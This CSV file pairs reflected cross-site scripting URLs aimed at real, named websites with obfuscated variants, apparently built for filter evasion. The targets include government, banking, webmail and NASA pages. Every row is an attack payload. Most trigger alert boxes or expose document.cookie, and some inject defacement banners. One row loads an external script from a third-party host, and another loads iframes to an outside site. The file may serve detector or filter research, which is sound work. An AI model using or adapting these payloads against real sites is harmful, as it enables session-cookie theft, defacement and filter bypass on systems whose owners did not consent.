Payloads,Original
http://www.atomicbobs.com/search.php?filter=default&amp;keyword=%22%3e%27%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3ealert`123`%3c/sc<br<!--Comment-->>ript%3e%3c/sc<br<!--Comment-->>ript%3e,http://www.atomicbobs.com/search.php?filter=default&amp;keyword=%22%3e%27%3e%3cscript%3ealert(123)%3c/sc<br>ript%3e
http://sexicq.ru/topic.php?id=%27%22%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->/title%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`%22xss%22`;%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e%3cmarq<br<!--Comment-->>uee%20bgcolor=%22red%22%3e%3cmarq<br<!--Comment-->>uee%20bgcolor=%22red%22%3e%3c<!--Comment-->h1%3e%3ch1<!--Comment-->%3exss%20by%20xylitol%3c<!--Comment-->/h1%3e%3c/h1<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e,http://sexicq.ru/topic.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert(%22xss%22);%3c/script%3e%3cmarq<br>uee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e
http://harmanim.co.il/index/search.php?search=%27%22%3e%3c<!--Comment-->%2ftitle%3e%3c%2ftitle<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`1337`%3c%2fsc<br>ript<!--Comment-->%3e%3c%2fsc<br>ript<!--Comment-->%3e%d7%97%d7%a4%d7%a9+%d7%95%d7%99%d7%93%d7%90%d7%95,http://harmanim.co.il/index/search.php?search=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fsc<br>ript%3e%d7%97%d7%a4%d7%a9+%d7%95%d7%99%d7%93%d7%90%d7%95
http://www.now7.co.uk/videogallery_watch_view.php?id=92%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`'airroxssed'`;%3c/scr<br>ipt<!--Comment-->%3e%3c/scr<br>ipt<!--Comment-->%3e%3c/scr<br>ipt<!--Comment-->%3e%3c/scr<br>ipt<!--Comment-->%3e%3c/scr<br>ipt<!--Comment-->%3e%3c/scr<br>ipt<!--Comment-->%3e%3c/scr<br>ipt<!--Comment-->%3e%3c/scr<br>ipt<!--Comment-->%3e%3c/scr<br>ipt<!--Comment-->%3e%3c/scr<br>ipt<!--Comment-->%3e%3c/scr<br>ipt<!--Comment-->%3e%3c/scr<br>ipt<!--Comment-->%3e%3c/scr<br>ipt<!--Comment-->%3e%3c/scr<br>ipt<!--Comment-->%3e%3c/scr<br>ipt<!--Comment-->%3e%3c/scr<br>ipt<!--Comment-->%3e,http://www.now7.co.uk/videogallery_watch_view.php?id=92%22%3e%3cscript%3ealert('airroxssed');%3c/scr<br>ipt%3e
http://www.excite.co.jp/world/chinese/web/proceeding/?wb_url=http%3a%2f%2fkusomiso.com%2f%22%3e%27%3<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28%22kusomiso.com%22%29%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e&amp;wb_submit=%e3%82%a6%e3%82%a7%e3%83%96%e3%8<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>3%9a%e3%83%bc%e3%82%b8%e7%bf%bb%e8%a8%b3&amp;wb_lp=chja,http://www.excite.co.jp/world/chinese/web/proceeding/?wb_url=http%3a%2f%2fkusomiso.com%2f%22%3e%27%3<br>e%3cscript%3ealert%28%22kusomiso.com%22%29%3c%2fscript%3e&amp;wb_submit=%e3%82%a6%e3%82%a7%e3%83%96%e3%8<br>3%9a%e3%83%bc%e3%82%b8%e7%bf%bb%e8%a8%b3&amp;wb_lp=chja
"http://tv.mofile.com/tags/%22%3e%3cmarquee<!--Comment-->%3e%3c<!--Comment-->marquee%3edeafced%20by%20sponsfull%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e:0,1,10,1,0,0,aud<br<!--Comment-->><br<!--Comment-->>ittime,0,","http://tv.mofile.com/tags/%22%3e%3cmarquee%3edeafced%20by%20sponsfull%3c/marquee%3e:0,1,10,1,0,0,aud<br>ittime,0,"
http://douane.gouv.fr/contact.asp?type=%22%3e'%3e%3cscript%20src=http://vuln.xssed.net/thirdparty/sc<br>ripts/python5.js<!--Comment-->%3e%3cscript%20src=http://vuln.xssed.net/thirdparty/sc<br<!--Comment-->>ripts/python5.js%3e%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e,http://douane.gouv.fr/contact.asp?type=%22%3e'%3e%3cscript%20src=http://vuln.xssed.net/thirdparty/sc<br>ripts/python5.js%3e%3c/script%3e
http://www.esenyayinlari.com.tr/veri/urun/urunler.asp?kategori_id=10&amp;kategori_adi=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;script<!--Comment-->&gt;alert`/f<br<!--Comment-->><br<!--Comment-->>ck/`&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;,http://www.esenyayinlari.com.tr/veri/urun/urunler.asp?kategori_id=10&amp;kategori_adi=&quot;&gt;&lt;script&gt;alert(/f<br>ck/)&lt;/script&gt;
http://www.nod32.se/t_product_view.php?product_id=&quot;&gt;&lt;script%20%0a%0d<!--Comment-->&gt;&lt;script%20%0a%0d<!--Comment-->&gt;&lt;<!--Comment-->script%20%0a%0d&gt;&lt;<!--Comment-->script%20%0a%0d&gt;alert`41551.8863228704`%3b&lt;/scr<br>ipt<!--Comment-->&gt;&lt;/scr<br>ipt<!--Comment-->&gt;&lt;<!--Comment-->/scr<br>ipt&gt;&lt;<!--Comment-->/scr<br>ipt&gt;,http://www.nod32.se/t_product_view.php?product_id=&quot;&gt;&lt;script%20%0a%0d&gt;alert(41551.8863228704)%3b&lt;/scr<br>ipt&gt;
http://www.mercadolibre.com.uy/uruguay/ml/l_user.main?as_filtro_id=certified_usr&as_nickname=%a0&as_pcia_id=%3e%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert%28%27xss%27%29;%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e,http://www.mercadolibre.com.uy/uruguay/ml/l_user.main?as_filtro_id=certified_usr&as_nickname=%a0&as_pcia_id=%3e%22%3e%3cscript%3ealert%28%27xss%27%29;%3c/script%3e
http://www.okuluygulamalari.net/okuluygulamalari.net/forum/philboard_search.asp?searchterms=&quot;&gt;&lt;<!--Comment-->scrip<br>t&gt;&lt;<!--Comment-->scrip<br>t&gt;alert`document.cookie`&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;www.raptr.us.tc&lt;/h1<!--Comment-->&gt;&lt;<!--Comment-->/h1&gt;,http://www.okuluygulamalari.net/okuluygulamalari.net/forum/philboard_search.asp?searchterms=&quot;&gt;&lt;scrip<br>t&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;
http://sitesearch.corriere.it/searchresults.jsp?xslurl=http%3a%2f%2fwww.corriere.it%2ftools%2fsearch<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>corriere%2ftemplateadscorriere.xsl&amp;adsenvironment=corriere&amp;channel_par=corriere&amp;num_par=0&amp;ricerca_pa<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>r=%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28&quot;security%20sux&quot;%29%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e&amp;numss_par=10&amp;offsetss_par=0&amp;ordss_par<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>=data&amp;numas_par=3&amp;offsetas_par=0&amp;ordas_par=data&amp;ordasdir_par=desc&amp;ad_par=w6n3&amp;adpage=1&amp;hl_par=it,http://sitesearch.corriere.it/searchresults.jsp?xslurl=http%3a%2f%2fwww.corriere.it%2ftools%2fsearch<br>corriere%2ftemplateadscorriere.xsl&amp;adsenvironment=corriere&amp;channel_par=corriere&amp;num_par=0&amp;ricerca_pa<br>r=%22%3e%3cscript%3ealert%28&quot;security%20sux&quot;%29%3c%2fscript%3e&amp;numss_par=10&amp;offsetss_par=0&amp;ordss_par<br>=data&amp;numas_par=3&amp;offsetas_par=0&amp;ordas_par=data&amp;ordasdir_par=desc&amp;ad_par=w6n3&amp;adpage=1&amp;hl_par=it
http://saturn.jpl.nasa.gov/multimedia/poll/index.cfm?pollcontentid=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert`&quot;maxwel&quot;`&lt;<!--Comment-->/script<br>&gt;&lt;<!--Comment-->/script<br>&gt;&lt;/script<br<!--Comment-->>&gt;&lt;/script<br<!--Comment-->>&gt;,http://saturn.jpl.nasa.gov/multimedia/poll/index.cfm?pollcontentid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script<br>&gt;
http://aic.sanya.gov.cn/?cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][<br<!--Comment-->><br<!--Comment-->>]=%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`document.cookie`%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e,http://aic.sanya.gov.cn/?cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][<br>]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3c/script%3e
http://www.neopets.com/guilds/preview_guild.phtml?guild_bgcolor=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert`document.cookie`&lt;/sc<br>ript<!--Comment-->&gt;&lt;/sc<br>ript<!--Comment-->&gt;&lt;<!--Comment-->/sc<br>ript&gt;&lt;<!--Comment-->/sc<br>ript&gt;,http://www.neopets.com/guilds/preview_guild.phtml?guild_bgcolor=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/sc<br>ript&gt;
https://bamlservice.bankofamerica.com/auth/public/transition?targeturl=$sm$http://xssed.com/?%22%3e%<br<!--Comment--><!--Comment--><br<!-<!--Comment-->-Comment--><br<!--Comment--><!--Comment--><br<!--Comment--><!--Comment--><br<!--Comment--><!--Comment--><br<!--Comment--><!--Comment--><br<!-<!--Comment-->-Comment--><br<!--Comment--><!--Comment-->><br<!--Comment--<!--Comment-->><br<!--Comment--<!--Comment-->><br<!--Comment--<!--Comment-->><br<!--Comment--<!--Comment-->><br<!-<!--Comment-->-Comment--><br<!-<!--Comment-->-Comment--><br<!--Comment--><!--Comment--><br<!--Comment--><!--Comment-->>3cscript%3ealert%28document.cookie%29%3c/script<!--Comment--<!--Comment-->>%3e%3c<!--Comment-->/script<!--Comment-->%3e%3c/script<!-<!--Comment-->-Comment-->%3e%3c/script<!--Comment--><!--Comment-->%3e%3c/script<!--Comment--><!--Comment-->%3e%3c/script<!-<!--Comment-->-Comment-->%3e%3c/script<!--Comment--<!--Comment-->>%3e%3c<!--Comment-->/script<!--Comment-->%3e%3c<!--Comment--><!--Comment-->/script%3e%3c<!-<!--Comment-->-Comment-->/script%3e%3c<!--Comment--><!--Comment-->/script%3e%3c<!--Comment--<!--Comment-->>/script%3e%3c<!-<!--Comment-->-Comment-->/script%3e%3c<!-<!--Comment-->-Comment-->/script%3e%3c<!--Comment--><!--Comment-->/script%3e%3c<!--Comment--><!--Comment-->/script%3e,https://bamlservice.bankofamerica.com/auth/public/transition?targeturl=$sm$http://xssed.com/?%22%3e%<br>3cscript%3ealert%28document.cookie%29%3c/script%3e
http://www.forces.org/scientific_portal/evidence_viewer.php?id=%27%22%3e%27%22%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c<!--Comment-->scri<br>pt%3e%3cscri<br<!--Comment-->>pt%3ealert`1337`%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3e%3c<!--Comment-->marquee%3e%3cmarquee<!--Comment-->%3e%3ch1<!--Comment-->%3e%3c<!--Comment-->h1%3exss%20by%20xylitol%3c/h1<!--Comment-->%3e%3c<!--Comment-->/h1%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e,http://www.forces.org/scientific_portal/evidence_viewer.php?id=%27%22%3e%27%22%3e%3c/title%3e%3cscri<br>pt%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e
http://www.bmgaia.net/docbweb/indexres.asp?base=isbd&amp;prefix=&amp;indexkey==376-8716.&amp;maxtrm=20&amp;trmcols=2<br<!--Comment-->><br<!--Comment-->>&amp;form=comp&amp;recpag=5&amp;navdirection=0&amp;addtermo=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`document.cookie`&lt;/script<!--Comment-->&gt;&lt;<!--Comment-->/script&gt;,http://www.bmgaia.net/docbweb/indexres.asp?base=isbd&amp;prefix=&amp;indexkey==376-8716.&amp;maxtrm=20&amp;trmcols=2<br>&amp;form=comp&amp;recpag=5&amp;navdirection=0&amp;addtermo=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://audio.kavkazcenter.com/index.php?cat=3e%22%3e%3cscript%20%0a%0d<!--Comment-->%3e%3cscript%20%0a%0d<!--Comment-->%3e%3c<!--Comment-->script%20%0a%0d%3e%3c<!--Comment-->script%20%0a%0d%3ealert`document.cookie`%3b%3<br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment-->>c/script%3e,http://audio.kavkazcenter.com/index.php?cat=3e%22%3e%3cscript%20%0a%0d%3ealert(document.cookie)%3b%3<br>c/script%3e
http://www.ecartproduction.net/commande/achat/recherche.php?motclef=%3c%3c<!--Comment-->script%3e%3c%3c<!--Comment-->script%3e%3c%3c<!--Comment-->script%3e%3c%3c<!--Comment-->script%3e%3c%3c<!--Comment-->script%3e%3c%3c<!--Comment-->script%3e%3c%3c<!--Comment-->script%3e%3c%3c<!--Comment-->script%3e%3c%3cscript<!--Comment-->%3e%3c%3cscript<!--Comment-->%3e%3c%3cscript<!--Comment-->%3e%3c%3cscript<!--Comment-->%3e%3c%3cscript<!--Comment-->%3e%3c%3cscript<!--Comment-->%3e%3c%3cscript<!--Comment-->%3e%3c%3cscript<!--Comment-->%3ealert`%22resistan<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>ce%22`;//%3c<!--Comment-->%3c/script%3e%3c<!--Comment-->%3c/script%3e%3c<!--Comment-->%3c/script%3e%3c<!--Comment-->%3c/script%3e%3c<!--Comment-->%3c/script%3e%3c<!--Comment-->%3c/script%3e%3c<!--Comment-->%3c/script%3e%3c<!--Comment-->%3c/script%3e%3c<!--Comment-->%3c/script%3e%3c<!--Comment-->%3c/script%3e%3c<!--Comment-->%3c/script%3e%3c<!--Comment-->%3c/script%3e%3c<!--Comment-->%3c/script%3e%3c<!--Comment-->%3c/script%3e%3c<!--Comment-->%3c/script%3e%3c<!--Comment-->%3c/script%3e,http://www.ecartproduction.net/commande/achat/recherche.php?motclef=%3c%3cscript%3ealert(%22resistan<br>ce%22);//%3c%3c/script%3e
http://eu.computers.toshiba-europe.com/cgi-bin/toshibacsg/registration_basic.jsp?service=eu&amp;event=''<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert`'xss'`&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;'&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;sedatt&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;,http://eu.computers.toshiba-europe.com/cgi-bin/toshibacsg/registration_basic.jsp?service=eu&amp;event=''<br>&gt;&lt;script&gt;alert('xss')&lt;/script&gt;'&gt;&lt;h1&gt;sedatt&lt;/h1&gt;
https://webmail.centurytel.net/webmail//index.cfm?action=login&amp;ultimateaction=email&amp;requesttimeout=8<br<!--Comment-->><br<!--Comment-->>0&amp;portal_id=0&amp;strloginmsgid='%3e%22%3e'%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3ealert`%22xss%20by%20kusomiso.com%22`%3c/script<br<!--Comment-->>%3e%3c/script<br><!--Comment-->%3ee%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e,https://webmail.centurytel.net/webmail//index.cfm?action=login&amp;ultimateaction=email&amp;requesttimeout=8<br>0&amp;portal_id=0&amp;strloginmsgid='%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusomiso.com%22)%3c/script<br>%3ee%3c/marquee%3e
http://www.nationalarchives.gov.uk/catalogue/searchresults.asp?catref=%27%22%3e%3c<!--Comment-->iframe+src%3dhttp%<br<!--Comment-->>3a%2f%2fxssed.com%3e%3c<!-<!--Comment-->-Comment-->iframe+src%3dhttp%<br>3a%2f%2fxssed.com%3e%3c<!--Comment-->iframe+src%3dhttp%<br>3a%2f%2fxssed.com<!--Comment-->%3e%3c<!--Comment-->iframe+src%3dhttp%<br<!--Comment-->>3a%2f%2fxssed.com%3e%3c<!--Comment--><!--Comment-->iframe+src%3dhttp%<br>3a%2f%2fxssed.com%3e%3c<!-<!--Comment-->-Comment-->iframe+src%3dhttp%<br>3a%2f%2fxssed.com%3e%3c<!-<!--Comment-->-Comment-->iframe+src%3dhttp%<br>3a%2f%2fxssed.com%3e%3c<!--Comment-->iframe+src%3dhttp%<br<!--Comment-->>3a%2f%2fxssed.com%3e%3ciframe+src%3dhttp%<br>3a%2f%2fxssed.com<!-<!--Comment-->-Comment-->%3e%3ciframe+src%3dhttp%<br<!--Comment-->>3a%2f%2fxssed.com<!--Comment-->%3e%3ciframe+src%3dhttp%<br>3a%2f%2fxssed.com<!--Comment--<!--Comment-->>%3e%3ciframe+src%3dhttp%<br>3a%2f%2fxssed.com<!--Comment--<!--Comment-->>%3e%3ciframe+src%3dhttp%<br<!--Comment-->>3a%2f%2fxssed.com<!--Comment-->%3e%3ciframe+src%3dhttp%<br<!--Comment-->>3a%2f%2fxssed.com<!--Comment-->%3e%3ciframe+src%3dhttp%<br>3a%2f%2fxssed.com<!--Comment--><!--Comment-->%3e%3ciframe+src%3dhttp%<br<!--Comment-->>3a%2f%2fxssed.com<!--Comment-->%3e&amp;gotoref.x=0&amp;gotoref.y=0&amp;gotoref=go&amp;searchtype=6&amp;searchinit=4,http://www.nationalarchives.gov.uk/catalogue/searchresults.asp?catref=%27%22%3e%3ciframe+src%3dhttp%<br>3a%2f%2fxssed.com%3e&amp;gotoref.x=0&amp;gotoref.y=0&amp;gotoref=go&amp;searchtype=6&amp;searchinit=4
"http://bank-maskan.ir/page.aspx?search=""><sc<!--Comment--><!--Comment--><sc<!--Comment--><!--Comment--><sc<!--Comment--><!--Comment--><sc<!-<!--Comment-->-Comment--><sc<!--Comment--><!--Comment--><sc<!--Comment--<!--Comment-->><sc<!--Comment--><!--Comment--><sc<!--Comment--<!--Comment-->>ript><script<!--Comment--<!--Comment-->><script<!--Comment--<!--Comment-->><script<!-<!--Comment-->-Comment--><script<!-<!--Comment-->-Comment--><sc<!--Comment-->ript<!--Comment--><sc<!--Comment-->ript<!--Comment--><sc<!--Comment-->ript<!--Comment--><script<!-<!--Comment-->-Comment-->>alert`'by :takpar'`</script<!-<!--Comment-->-Comment--></script<!--Comment--<!--Comment-->></script<!-<!--Comment-->-Comment--></script<!--Comment--<!--Comment-->></s<!--Comment-->cript<!--Comment--></script<!-<!--Comment-->-Comment--></script<!-<!--Comment-->-Comment--></script<!--Comment--<!--Comment-->>></s<!--Comment--><!--Comment--></s<!-<!--Comment-->-Comment--></s<!-<!--Comment-->-Comment--></s<!--Comment--><!--Comment--></s<!--Comment--<!--Comment-->></s<!--Comment--<!--Comment-->></s<!-<!--Comment-->-Comment--></s<!-<!--Comment-->-Comment-->cript>&mid=1418&page=search/advancedsearch","http://bank-maskan.ir/page.aspx?search=""><script>alert('by :takpar')</script>&mid=1418&page=search/advancedsearch"
http://www.clickgratis.com.br/windows/index.php?query=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;<!--Comment-->script&gt;alert`document.cookie`&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&gt;&lt;mar<br>quee<!--Comment-->&gt;&lt;mar<br>quee<!--Comment-->&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;by+narcoticxs&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;<!--Comment-->/marquee&gt;&lt;/marquee<!--Comment-->&gt;,http://www.clickgratis.com.br/windows/index.php?query=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;
http://www.yosoygilda.com.ar/a-volver.asp?foto=%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c/h1<!--Comment-->%3e%3c/h1<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3ealert`'cim%20estuvo%20aq<br<!--Comment-->><br<!--Comment-->>ui'`;%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3cfont%20color=%22ff0000%22<!--Comment-->%3e%3c<!--Comment-->font%20color=%22ff0000%22%3eobexico%20estuvo%20aqui%3c<!--Comment-->/font%3e%3c<!--Comment-->/font%3e%3c<!--Comment-->img%20src=%22h<br>ttp://cim.yethost.com/logocimxy3.png%22%3e%3cimg%20src=%22h<br<!--Comment-->>ttp://cim.yethost.com/logocimxy3.png%22%3e,http://www.yosoygilda.com.ar/a-volver.asp?foto=%3ch1%3e%3c/h1%3e%3cscript%3ealert('cim%20estuvo%20aq<br>ui');%3c/script%3e%3cfont%20color=%22ff0000%22%3eobexico%20estuvo%20aqui%3c/font%3e%3cimg%20src=%22h<br>ttp://cim.yethost.com/logocimxy3.png%22%3e
